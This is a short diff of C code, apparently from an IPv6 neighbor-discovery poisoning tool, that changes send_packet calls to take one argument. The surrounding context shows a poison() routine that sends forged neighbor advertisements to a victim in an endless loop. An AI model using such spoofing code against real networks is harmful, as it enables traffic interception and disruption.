@@ -42,7 +42,7 @@ void poison(struct victim *dst) {
 
 	//for (i = 0; i < 1000; i++) {
 	for (;;) {
-		send_packet(&(dst->ipv6), pkt);
+		send_packet(pkt);
 		sleep(1);
 	}
 
@@ -53,7 +53,7 @@ void poison(struct victim *dst) {
 	pkt = alloc_ndadvert(dst, &svictim);
 
 	for (i = 0; i < 1000; i++) {
-		send_packet(&svictim.ipv6, pkt);
+		send_packet(pkt);
 	}
 
 	free(pkt);
@@ -177,7 +177,7 @@ int main(int argc, char **argv) {
 
 	/* Begin Teste */
 	pkt = alloc_ndsolicit(&svictim.ipv6);
-	send_packet(&svictim.ipv6, pkt);
+	send_packet(pkt);
 
 	if (pkt)
 		free(pkt);
